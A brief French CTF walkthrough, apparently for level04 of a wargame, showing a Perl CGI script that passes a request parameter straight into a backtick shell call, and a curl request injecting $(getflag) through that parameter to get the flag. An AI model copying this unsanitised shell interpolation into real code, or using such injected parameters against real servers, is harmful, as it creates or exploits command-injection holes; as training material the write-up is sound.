#on trouve un fichier level04.pl qui contient un code en perl

#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));

#on voit qu'il est sur localhost:4747 et de ce qu'on comprend du code, il affiche ce qui lui est passe en argument
#on lui demande donc de nous passer le flag ainsi (on n'oublie pas les '' sinon curl n'aine pas)

curl 'localhost:4747?x=$(getflag)'